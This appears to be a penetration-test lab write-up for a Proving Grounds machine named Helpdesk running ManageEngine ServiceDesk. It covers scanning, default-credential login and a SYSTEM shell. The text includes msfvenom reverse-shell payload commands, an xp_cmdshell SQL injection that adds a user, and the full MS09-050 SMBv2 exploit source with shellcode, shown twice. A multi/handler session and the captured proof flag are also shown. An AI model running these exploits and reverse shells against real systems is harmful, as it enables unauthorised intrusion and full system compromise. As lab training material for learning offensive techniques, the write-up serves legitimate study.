# Helpdesk

## Enumeration

Autorecon

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk]
└─$ sudo /home/kali/.local/bin/autorecon 192.168.90.43 -vv 

[*] Scanning target 192.168.90.43
[*] Port scan Top TCP Ports (top-tcp-ports) running against 192.168.90.43
[*] Port scan Top TCP Ports (top-tcp-ports) is running the following command against 192.168.90.43: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/_quick_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/xml/_quick_tcp_nmap.xml" 192.168.90.43
[*] Port scan All TCP Ports (all-tcp-ports) running against 192.168.90.43
[*] Port scan All TCP Ports (all-tcp-ports) is running the following command against 192.168.90.43: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/xml/_full_tcp_nmap.xml" 192.168.90.43
[*] Port scan Top 100 UDP Ports (top-100-udp-ports) running against 192.168.90.43
[*] Port scan Top 100 UDP Ports (top-100-udp-ports) is running the following command against 192.168.90.43: nmap -vv --reason -Pn -T4 -sU -A --top-ports 100 -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/_top_100_udp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/xml/_top_100_udp_nmap.xml" 192.168.90.43
[*] Discovered open port tcp/445 on 192.168.90.43
[*] Discovered open port tcp/8080 on 192.168.90.43
[*] Discovered open port tcp/3389 on 192.168.90.43
[*] Discovered open port tcp/135 on 192.168.90.43
[*] Discovered open port tcp/139 on 192.168.90.43
[*] Discovered open port udp/137 on 192.168.90.43
[*] 06:43:40 - There are 3 scans still running against 192.168.90.43: top-tcp-ports, all-tcp-ports, top-100-udp-ports
[*] Port scan Top TCP Ports (top-tcp-ports) against 192.168.90.43 finished in 1 minute, 13 seconds
[*] Identified service msrpc on tcp/135 on 192.168.90.43
[*] Identified service netbios-ssn on tcp/139 on 192.168.90.43
[*] Identified service microsoft-ds on tcp/445 on 192.168.90.43
[!] [tcp/445/microsoft-ds/enum4linux against 192.168.90.43] Plugin should only be run once and it appears to have already been queued. Skipping.
[!] [tcp/445/microsoft-ds/nbtscan against 192.168.90.43] Plugin should only be run once and it appears to have already been queued. Skipping.
[!] [tcp/445/microsoft-ds/smbclient against 192.168.90.43] Plugin should only be run once and it appears to have already been queued. Skipping.
[*] Identified service ms-wbt-server on tcp/3389 on 192.168.90.43
[*] Identified service http on tcp/8080 on 192.168.90.43
[*] Service scan Nmap MSRPC (tcp/135/msrpc/nmap-msrpc) running against 192.168.90.43
[*] Service scan Nmap MSRPC (tcp/135/msrpc/nmap-msrpc) is running the following command against 192.168.90.43: nmap -vv --reason -Pn -T4 -sV -p 135 --script="banner,msrpc-enum,rpc-grind,rpcinfo" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/tcp135/tcp_135_rpc_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/tcp135/xml/tcp_135_rpc_nmap.xml" 192.168.90.43
[*] Service scan rpcdump (tcp/135/msrpc/rpcdump) running against 192.168.90.43
[*] Service scan rpcdump (tcp/135/msrpc/rpcdump) is running the following command against 192.168.90.43: impacket-rpcdump -port 135 192.168.90.43
[*] Service scan Enum4Linux (tcp/139/netbios-ssn/enum4linux) running against 192.168.90.43
[*] Service scan Enum4Linux (tcp/139/netbios-ssn/enum4linux) is running the following command against 192.168.90.43: enum4linux -a -M -l -d 192.168.90.43 2>&1
[*] Service scan nbtscan (tcp/139/netbios-ssn/nbtscan) running against 192.168.90.43
[*] Service scan nbtscan (tcp/139/netbios-ssn/nbtscan) is running the following command against 192.168.90.43: nbtscan -rvh 192.168.90.43 2>&1
[*] Service scan Nmap SMB (tcp/139/netbios-ssn/nmap-smb) running against 192.168.90.43
[*] Service scan Nmap SMB (tcp/139/netbios-ssn/nmap-smb) is running the following command against 192.168.90.43: nmap -vv --reason -Pn -T4 -sV -p 139 --script="banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/tcp139/tcp_139_smb_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Helpdesk/results/192.168.90.43/scans/tcp139/xml/tcp_139_smb_nmap.xml" 192.168.90.43
[*] Service scan SMBClient (tcp/139/netbios-ssn/smbclient) running
```

### Web

![](Pasted%20image%2020220112162945.png)

Default credentials can be founnd here
`administrator`:`administrator`

![](Pasted%20image%2020220112192517.png)

### Vuln Enumeration

```
                                                                                                                                                                     
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap -p 135,445,3389,8080 --script vuln 192.168.90.43  -Pn -v
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-12 07:32 EST
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 07:32
Completed NSE at 07:32, 10.00s elapsed
Initiating NSE at 07:32
Completed NSE at 07:32, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 07:32
Completed Parallel DNS resolution of 1 host. at 07:32, 0.00s elapsed
Initiating SYN Stealth Scan at 07:32
Scanning 192.168.90.43 [4 ports]
Discovered open port 8080/tcp on 192.168.90.43
Discovered open port 3389/tcp on 192.168.90.43
Discovered open port 445/tcp on 192.168.90.43
Discovered open port 135/tcp on 192.168.90.43
Completed SYN Stealth Scan at 07:32, 0.26s elapsed (4 total ports)
NSE: Script scanning 192.168.90.43.
Initiating NSE at 07:32
NSE: [ssl-ccs-injection] No response from server: ERROR
Completed NSE at 07:34, 109.64s elapsed
Initiating NSE at 07:34
Completed NSE at 07:34, 0.00s elapsed
Nmap scan report for 192.168.90.43
Host is up (0.20s latency).

PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
8080/tcp open  http-proxy
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

NSE: Script Post-scanning.
Initiating NSE at 07:34
Completed NSE at 07:34, 0.00s elapsed
Initiating NSE at 07:34
Completed NSE at 07:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 120.46 seconds
           Raw packets sent: 4 (176B) | Rcvd: 15 (2.749KB)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]

```

## Exploitation


### Dir Traversal to CVE

https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py
```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hawat]
└─$ wget https://raw.githubusercontent.com/PeterSufliarsky/exploits/master/CVE-2014-5301.py     

...

──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hawat]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.215 LPORT=4444 -f war > /tmp/shell.war
Payload size: 13403 bytes
Final size of war file: 13403 bytes

                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Hawat]
└─$ python CVE-2014-5301.py 192.168.215.43  8080 administrator administrator /tmp/shell.war   
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Trying http://192.168.215.43:8080/B2MR8h1LGyDOI0NV9bDZKxQtZge2vD45/lcorzdhoz/i4EFRBWJH7DhZO3a
Trying http://192.168.215.43:8080/B2MR8h1LGyDOI0NV9bDZKxQtZge2vD45/lcorzdhoz/5azCD2ANIBAzQDky
Trying http://192.168.215.43:8080/B2MR8h1LGyDOI0NV9bDZKxQtZge2vD45/lcorzdhoz/dv3ya0q5ZaoF811Z
Trying http://192.168.215.43:8080/B2MR8h1LGyDOI0NV9bDZKxQtZge2vD45/lcorzdhoz/pYjhjddl7vNN6w9s
Trying http://192.168.215.43:8080/B2MR8h1LGyDOI0NV9bDZKxQtZge2vD45/lcorzdhoz/SIivQgllym8pobDL

```

https://github.com/AndyCyberSec/OSCP/blob/master/35845.py

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.215 LPORT=4444 -f war > /tmp/shell.war  
Payload size: 13404 bytes
Final size of war file: 13404 bytes

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python 35845.py /tmp/shell.war 192.168.90.43 8080                                         
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Requesting http://192.168.90.43:8080/
Attempting login with default credentials: guest/guest
[+] Login successfull!
Uploading the payload on the server...
Uploading the payload on the server...
[+] Payload uploaded successfully!
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
Attempting to launch payload in deployed WAR...
[-] Reverse shell not coming..
[+] Try to manually check here: http://192.168.90.43:8080/Fl2g2bVmjcreviSG/ynHtNT/nuLOFkkiP
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.90.43:8080/Fl2g2bVmjcreviSG/ynHtNT/nuLOFkkiP

<html><head><title>Apache Tomcat/5.0.28 - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - /Fl2g2bVmjcreviSG/ynHtNT/nuLOFkkiP</h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u>/Fl2g2bVmjcreviSG/ynHtNT/nuLOFkkiP</u></p><p><b>description</b> <u>The requested resource (/Fl2g2bVmjcreviSG/ynHtNT/nuLOFkkiP) is not available.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/5.0.28</h3></body></html>                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

### SQL Injections
`:8080/WorkOrder.do?woMode=viewWO&woID=1); EXEC xp_cmdshell 'net user
moebius m03biu5inj3ct$ /add';--`
![](Pasted%20image%2020220112195226.png)

### SMB Exploits - Kinda Works

```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 40280                                         
  Exploit: Microsoft Windows - 'srv2.sys' SMB Code Execution (Python) (MS09-050)
      URL: https://www.exploit-db.com/exploits/40280
     Path: /usr/share/exploitdb/exploits/windows/remote/40280.py
File Type: Python script, ASCII text executable

Copied to: /tmp/40280.py


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ mousepad 40280                                                                              
                       
┌──(kali㉿kali)-[/tmp]
└─$ cat 40280.py                                                                                                                                                  130 ⨯
# EDB-Note: Source ~ https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py

#!/usr/bin/python
#This module depends on the linux command line program smbclient.
#I can't find a python smb library for smb login. If you can find one, you can replace that part of the code with the smb login function in python.
#The idea is that after the evil payload is injected by the first packet, it need to be trigger by an authentication event. Whether the authentication successes or not does not matter.
import tempfile
import sys
import subprocess
from socket import socket
from time import sleep
from smb.SMBConnection import SMBConnection


try:

        target = sys.argv[1]
except IndexError:
        print '\nUsage: %s <target ip>\n' % sys.argv[0]
        print 'Example: MS36299.py 192.168.1.1 1\n'
        sys.exit(-1)

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread  -f python
import os
os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.90 LPORT=443  EXITFUNC=thread  -f python > i.py")
from i import buf
shell = buf


host = target, 445

buff ="\x00\x00\x03\x9e\xff\x53\x4d\x42"
buff+="\x72\x00\x00\x00\x00\x18\x53\xc8"
buff+="\x17\x02" #high process ID
buff+="\x00\xe9\x58\x01\x00\x00"
buff+="\x00\x00\x00\x00\x00\x00\x00\x00"
buff+="\x00\x00\xfe\xda\x00\x7b\x03\x02"
buff+="\x04\x0d\xdf\xff"*25
buff+="\x00\x02\x53\x4d"
buff+="\x42\x20\x32\x2e\x30\x30\x32\x00"
buff+="\x00\x00\x00\x00"*37
buff+="\xff\xff\xff\xff"*2
buff+="\x42\x42\x42\x42"*7
buff+="\xb4\xff\xff\x3f" #magic index
buff+="\x41\x41\x41\x41"*6
buff+="\x09\x0d\xd0\xff" #return address

#stager_sysenter_hook from metasploit

buff+="\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
buff+="\x00\x00\x59\x0f\x32\x89\x46\x5d"
buff+="\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
buff+="\x16\x02\x00\x00\xf3\xa4\xfb\xf4"
buff+="\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
buff+="\x00\x9c\x60\xe8\x00\x00\x00\x00"
buff+="\x58\x8b\x58\x54\x89\x5c\x24\x24"
buff+="\x81\xf9\xde\xc0\xad\xde\x75\x10"
buff+="\x68\x76\x01\x00\x00\x59\x89\xd8"
buff+="\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
buff+="\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
buff+="\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
buff+="\x5b\x69\x89\x1a\xb8\x01\x00\x00"
buff+="\x80\x0f\xa2\x81\xe2\x00\x00\x10"
buff+="\x00\x74\x0e\xba\x00\xff\x3f\xc0"
buff+="\x83\xc2\x04\x81\x22\xff\xff\xff"
buff+="\x7f\x61\x9d\xc3\xff\xff\xff\xff"
buff+="\x00\x04\xdf\xff\x00\x04\xfe\x7f"
buff+="\x60\x6a\x30\x58\x99\x64\x8b\x18"
buff+="\x39\x53\x0c\x74\x2b\x8b\x43\x10"
buff+="\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
buff+="\x03\x48\x03\x81\xf9\x6c\x61\x73"
buff+="\x73\x75\x15\xe8\x07\x00\x00\x00"
buff+="\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
buff+="\xde\xc0\xad\xde\x89\xe2\x0f\x34"
buff+="\x61\xc3\x81\xc4\x54\xf2\xff\xff"

buff+=shell

s = socket()
s.connect(host)
s.send(buff)
s.close()
#Trigger the above injected code via authenticated process.
subprocess.call("echo '1223456' | rpcclient -U Administrator %s"%(target), shell=True)                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python 40280.py 192.168.90.43 1 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 362 bytes
Final size of python file: 1767 bytes
^CTraceback (most recent call last):
  File "40280.py", line 80, in <module>
    s.connect(host)
  File "/usr/lib/python2.7/socket.py", line 228, in meth
    return getattr(self._sock,name)(*args)
KeyboardInterrupt
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python 40280.py 192.168.90.43 1                                                                                                                                 1 ⨯
        [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 362 bytes
Final size of python file: 1767 bytes
Enter WORKGROUP\Administrator's password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
                            
```

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 443                                                                                                                                               1 ⨯
listening on [any] 443 ...
connect to [192.168.49.90] from (UNKNOWN) [192.168.90.43] 49180
whoami
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

## 40280 - Exploit Modification
Exploit

I used a staged payload just in case

```
# EDB-Note: Source ~ https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py

#!/usr/bin/python
#This module depends on the linux command line program smbclient.
#I can't find a python smb library for smb login. If you can find one, you can replace that part of the code with the smb login function in python.
#The idea is that after the evil payload is injected by the first packet, it need to be trigger by an authentication event. Whether the authentication successes or not does not matter.
import tempfile
import sys
import subprocess
from socket import socket
from time import sleep
from smb.SMBConnection import SMBConnection


try:

	target = sys.argv[1]
except IndexError:
	print '\nUsage: %s <target ip>\n' % sys.argv[0]
	print 'Example: MS36299.py 192.168.1.1 1\n'
	sys.exit(-1)

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread  -f python
import os
os.system("msfvenom -p windows/shell/reverse_tcp LHOST=192.168.49.90 LPORT=443  EXITFUNC=thread  -f python > i.py")
from i import buf
shell = buf


host = target, 445

buff ="\x00\x00\x03\x9e\xff\x53\x4d\x42"
buff+="\x72\x00\x00\x00\x00\x18\x53\xc8"
buff+="\x17\x02" #high process ID
buff+="\x00\xe9\x58\x01\x00\x00"
buff+="\x00\x00\x00\x00\x00\x00\x00\x00"
buff+="\x00\x00\xfe\xda\x00\x7b\x03\x02"
buff+="\x04\x0d\xdf\xff"*25
buff+="\x00\x02\x53\x4d"
buff+="\x42\x20\x32\x2e\x30\x30\x32\x00"
buff+="\x00\x00\x00\x00"*37
buff+="\xff\xff\xff\xff"*2
buff+="\x42\x42\x42\x42"*7
buff+="\xb4\xff\xff\x3f" #magic index
buff+="\x41\x41\x41\x41"*6
buff+="\x09\x0d\xd0\xff" #return address

#stager_sysenter_hook from metasploit

buff+="\xfc\xfa\xeb\x1e\x5e\x68\x76\x01"
buff+="\x00\x00\x59\x0f\x32\x89\x46\x5d"
buff+="\x8b\x7e\x61\x89\xf8\x0f\x30\xb9"
buff+="\x16\x02\x00\x00\xf3\xa4\xfb\xf4"
buff+="\xeb\xfd\xe8\xdd\xff\xff\xff\x6a"
buff+="\x00\x9c\x60\xe8\x00\x00\x00\x00"
buff+="\x58\x8b\x58\x54\x89\x5c\x24\x24"
buff+="\x81\xf9\xde\xc0\xad\xde\x75\x10"
buff+="\x68\x76\x01\x00\x00\x59\x89\xd8"
buff+="\x31\xd2\x0f\x30\x31\xc0\xeb\x31"
buff+="\x8b\x32\x0f\xb6\x1e\x66\x81\xfb"
buff+="\xc3\x00\x75\x25\x8b\x58\x5c\x8d"
buff+="\x5b\x69\x89\x1a\xb8\x01\x00\x00"
buff+="\x80\x0f\xa2\x81\xe2\x00\x00\x10"
buff+="\x00\x74\x0e\xba\x00\xff\x3f\xc0"
buff+="\x83\xc2\x04\x81\x22\xff\xff\xff"
buff+="\x7f\x61\x9d\xc3\xff\xff\xff\xff"
buff+="\x00\x04\xdf\xff\x00\x04\xfe\x7f"
buff+="\x60\x6a\x30\x58\x99\x64\x8b\x18"
buff+="\x39\x53\x0c\x74\x2b\x8b\x43\x10"
buff+="\x8b\x40\x3c\x83\xc0\x28\x8b\x08"
buff+="\x03\x48\x03\x81\xf9\x6c\x61\x73"
buff+="\x73\x75\x15\xe8\x07\x00\x00\x00"
buff+="\xe8\x0d\x00\x00\x00\xeb\x09\xb9"
buff+="\xde\xc0\xad\xde\x89\xe2\x0f\x34"
buff+="\x61\xc3\x81\xc4\x54\xf2\xff\xff"

buff+=shell

s = socket()
s.connect(host)
s.send(buff)
s.close()
#Trigger the above injected code via authenticated process.
subprocess.call("echo '1223456' | rpcclient -U Administrator %s"%(target), shell=True)
```

Running it

```
┌──(kali㉿kali)-[/tmp]
└─$ python 40280.py 192.168.90.43 1                                                                                                                                 1 ⚙
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 362 bytes
Final size of python file: 1767 bytes
Enter WORKGROUP\Administrator's password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]

```

Shell
```
┌──(kali㉿kali)-[/tmp]
└─$ sudo msfconsole -q                                                                                                                                              1 ⨯
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.49.90
LHOST => 192.168.49.90
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.90:443 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.90.43
[*] Command shell session 1 opened (192.168.49.90:443 -> 192.168.90.43:49191) at 2022-01-12 07:56:24 -0500

Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system


```

## Privesc

None
```

C:\Windows\system32>cd \
cd \

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\

09/18/2006  01:43 PM                24 autoexec.bat
09/18/2006  01:43 PM                10 config.sys
12/20/2009  03:06 AM    <DIR>          ManageEngine
01/19/2008  01:40 AM    <DIR>          PerfLogs
12/26/2012  11:53 PM    <DIR>          Program Files
12/19/2009  11:35 AM    <DIR>          Users
03/19/2020  04:48 PM    <DIR>          Windows
               2 File(s)             34 bytes
               5 Dir(s)   6,298,312,704 bytes free

C:\>cd Users
cd Users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BCAD-595B

 Directory of C:\Users\Administrator\Desktop

01/18/2016  08:32 AM    <DIR>          .
01/18/2016  08:32 AM    <DIR>          ..
12/20/2009  05:03 AM    <DIR>          ITSHARED
12/20/2009  04:05 AM             1,535 ManageEngine ServiceDesk.lnk
01/12/2022  04:49 AM                34 proof.txt
               2 File(s)          1,569 bytes
               3 Dir(s)   6,298,312,704 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
3a298170628dfc02f6e4dc0d50966be2

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::bc69:3e2d:a85d:cd63%11
   IPv4 Address. . . . . . . . . . . : 192.168.90.43
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.90.254

Tunnel adapter Local Area Connection*:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\Administrator\Desktop>

```


![](Pasted%20image%2020220112211147.png)

